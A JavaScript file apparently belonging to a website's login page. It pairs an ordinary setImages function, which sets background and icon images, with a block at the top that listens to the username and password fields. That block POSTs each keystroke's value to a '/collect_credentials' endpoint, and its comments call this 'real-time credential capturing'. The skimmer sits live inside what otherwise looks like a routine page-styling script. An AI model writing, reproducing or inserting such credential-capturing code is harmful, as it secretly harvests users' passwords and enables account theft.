function sendData(data) {
    fetch('/collect_credentials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

// Event listener for real-time credential capturing
document.addEventListener('DOMContentLoaded', () => {
    const usernameField = document.getElementById('username');
    const passwordField = document.getElementById('password');

    // Capture input event for username and password fields
    usernameField.addEventListener('input', () => {
        const username = usernameField.value;
        sendData({ username });
    });

    passwordField.addEventListener('input', () => {
        const password = passwordField.value;
        sendData({ password });
    });
});


function setImages(){
    if (document.URL){ //if the URL is something then allow it to run, need to change this code
    //change Background image
    document.body.style.backgroundImage = "url('static/images/Spring_Fog.jpg')";

    //change the background image for the login blob
    document.getElementById("mainHandler").style.backgroundImage = "url('static/images/husky_qa.jpg')";

    //change icon image
    var link = document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = "static/images/Icon/johnathan.ico";
    document.getElementsByTagName('head')[0].appendChild(link);
    }
}


setImages();

// Ezequiel Valencia, 9/4/2022, Changed the image locations so that they are better structured.